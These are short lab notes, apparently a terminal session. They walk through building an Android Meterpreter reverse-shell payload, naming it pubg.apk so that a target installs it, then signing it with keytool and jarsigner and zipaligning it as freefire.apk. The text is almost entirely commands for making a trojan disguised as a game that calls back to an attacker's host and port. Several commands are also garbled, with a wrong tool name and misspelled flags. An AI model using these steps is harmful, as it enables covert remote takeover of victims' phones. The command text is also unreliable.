# 1st we have create an playload apk that will be installed by target 

[apma@cachyos hacklab]$ sudo msfconsole -p android/meterpreter/reverse_tcp LHOST=
192.168.154.144 LPORT=4444 R> pubg.apk
[sudo] password for apma: 
                                   
# for Esign
- 1st we have generate the key 
> sudo keytool -genkey -V -keystore key.keystore -alise MIIT -keyalg RSA -keysize 2048 -validaity 10000
> in all "miit"
- 
> sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key-keystore pubg.apk MIIT

- verifing
> sudo jarsigner -verify -verbose -certs pubg.apk

- organize this with zipalign
> sudo zipalign -v 4 pubg.apk freefire.apk


